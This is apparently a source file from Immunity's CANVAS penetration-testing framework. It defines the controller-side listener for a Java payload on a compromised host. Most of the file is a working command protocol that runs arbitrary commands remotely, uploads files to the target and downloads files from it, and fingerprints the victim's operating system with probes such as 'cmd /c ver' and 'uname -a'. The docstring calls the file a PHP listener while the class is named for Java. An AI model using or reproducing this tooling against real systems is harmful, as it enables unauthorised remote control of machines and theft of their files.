#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

"""
phplistener.py

Listener for connections to PHP servers

"""
import os, sys
from shellserver import shellserver
from canvaserror import *

from exploitutils import *
import time
from libs.canvasos import canvasos
from canvaserror import *


class javalistener(shellserver):
    def __init__(self, connection , logfunction=None):
        devlog("javalistener","New Java listener connection:%s"%connection)
        self.engine=None
        self.sent_init_code=False
        shellserver.__init__(self,connection,type="Active",logfunction=logfunction)
        self.connection=connection #already done, but let's make it here as well
        self.na="This is a Java listener - that command is not supported"
    
    def startup(self):
        """
        Our first stage already loops, so we should be good to go on that.
        """
        return 
    
    def sendraw(self,buf):
        """
        send data to the remote side - reliable
        """
        self.connection.sendall(buf)
    
    def send_buf(self, buf):
        """
        send data block to remote side
        """
        
        self.sendraw(big_order(len(buf)) + buf)
    
    def read_string(self):
        """
        Read a string from the remote side
        """
        size=str2bigendian(reliablerecv(self.connection,4))
        # XXX: what if we're downloading big files?
        if size == 0xffffffff: # curb your C enthusiasm
            self.log("Garbled size value %x"%size)
            return ""
        devlog("javalistener","Reading data: %d bytes"%size)
        dataarray=[]
        if size==0:
            return ""
        gotsize=0
        while gotsize<size:
            data=self.connection.recv(size)
            dataarray+=[data]
            gotsize+=len(data)
        return "".join(dataarray)
    
    def send_command(self, command, args=""):
        """
        Sends a command to the remove side. 
        Format is:
        <size of args in bytes><command as big endian 32 bit integer><args>        
        """
        self.sendraw(big_order(len(args)) + big_order(command) + args)
        
    def pwd(self):
        """
        Get current working directory
        """
        
        self.send_command(1)
        ret=self.read_string()
        return ret

    def getcwd(self):
        return self.pwd()
    
    def runcommand(self,command):
        """
        Running a command is easy with a shell
        """
        #escape quotes
        # XXX
        command = command.encode('ascii')
        self.send_command(3,command)
        ret=self.read_string()
        return ret
    
    def shellcommand(self, command, LFkludge=False):
        """The UnixShellNode style interface, which returns the process exit code as well as the output. This isn't supported by
        javaNode.java, but should be. For now, we kludge. It's no worse than what runcommand does :(
        """
        x = self.runcommand(command)
        if len(x) > 1:
            rv = 0 
        else:
            rv = 1
            
        return (x, rv)
    
    def dospawn(self,command):
        return ""
    
    def dounlink(self,filename):
        return self.na
    
    def cd(self,directory):
        # XXX: another ascii hack
        directory = directory.encode('ascii')
        self.log("Changing directory to %s"%directory)
        self.send_command(2,directory) #no confirmation from this one
        return "Changed directory to %s"%directory
    
    def chdir(self,directory):
        return self.cd(directory)
    
    def dodir(self,directory):
        return self.na
    
    # XXX: this whole function needs to be redone and standardized ...
    def upload(self,source,dest=".",destfilename=None):
        # XXX ... kludgy ...
        source = source.encode('ascii')
        dest = dest.encode('ascii')
        
        if destfilename:
            destfilename = destfilename.encode('ascii')

        #print "XXX"
        #print repr(source)
        #print repr(dest)
        #print repr(destfilename)

        old_cwd = self.pwd()

        if dest and dest[0] != '.':
            # reparent the cwd
            self.cd(dest)

        dest = '.' # we parent relative to cwd ...

        try:
            fp = file(source,"rb")
            data = fp.read()
            fp.close()
        except IOError, i:
            e = "Error reading local file: %s" % str(i)
            self.log(e)
            raise NodeCommandError(e)
        
        if not destfilename:
            destfilename = dest + "/" + strip_leading_path(source)
        else:
            if len(dest) and dest[-1] not in "\\/":                
                dest += "/" 
            destfilename = dest + destfilename
        
        request = int2str32(len(destfilename))+destfilename+data 
        
        self.send_command(4,request)

        self.cd(old_cwd) # restore the old CWD ...
        
        return "Uploaded %d bytes from %s into %s" % (len(data), source, destfilename)
    
    def download(self,source,dest="."):
        ret = ""
        rv = True
        
        # XXX
        source = source.encode('ascii')

        if os.path.isdir(dest):
            dest=os.path.join(dest,source.replace("/","_").replace("\\","_"))
        
        try:
            outfile=open(dest,"wb")
        except IOError, i:
            e = "Failed to open local file: %s" % str(i)
            self.log(e)
            rv = False
            ret = e
        
        if rv:
            self.send_command(5,source)
            data=self.read_string()
            self.log("Got %d bytes"%len(data))            
            
            try:
                outfile.write(data)
                outfile.close()
                rv = True            
                ret = "Read %d bytes of data into %s"%(len(data),dest)
                self.log(ret)
                    
            except IOError,i:
                e = "Error writing to local file: %s" % str(i)
                self.log(e)
                ret = e
                rv = False
            
        if not rv:
            raise NodeCommandError(ret)
        
        return ret
    
    def get_shell(self):
        """
        spawn telnet client with remote end hooked to it
        TODO
        """
        pass
    
    def getPlatformInfo(self):
        """
        
        Very weird Windows 7 issue:
        http://www.techsupportforum.com/microsoft-support/windows-vista-windows-7-support/167785-running-cmd-exe.html
        http://social.technet.microsoft.com/Forums/en-US/w7itprogeneral/thread/2d506b96-e856-4752-90af-4f8194bb0040
        """
        if getattr(self, "failedDismallyAtPlatformInfo", False):
            self.log("No platform info available")
            return None
        
        # What about windows? XXX: implement boot.ini grabbing.
        #s = self.runcommand("cmd /c type %SYSTEMDRIVE%\\boot.ini")
        s = self.runcommand("cmd /c type %SYSTEMDRIVE%\\autoexec.bat")

        #this will work even when there is a cmd.exe in the path somewhere!
        if s and "NTVDM" in s:
            s = "Windows"
        else:
            s = self.runcommand("cmd /c ver")

            if s and "Windows" in s:
                s = "Windows"
            else:
                s = self.runcommand("ver.exe")
                
                if s and "Windows" in s:
                    s = "Windows"
                else:
                    s = self.runcommand("uname -a")
                    
                    if len(s) == 0:
                        self.log("Failed to get PlatformInfo")
                        self.failedDismallyAtPlatformInfo = True
                        return None
                    
                    self.log("Got platformInfo: %s" % s)
                    self.uname = s
                    os = canvasos()
                    os.load_uname(s)
                    ret = os
                    return ret
                
        if s == "Windows":
            os = canvasos()
            os.load_uname({"sysname":"Windows",
                           "release":None,
                           "machine":"x86"})
            return os
        
        return None 
        
if __name__=="__main__":
    p=javalistener()
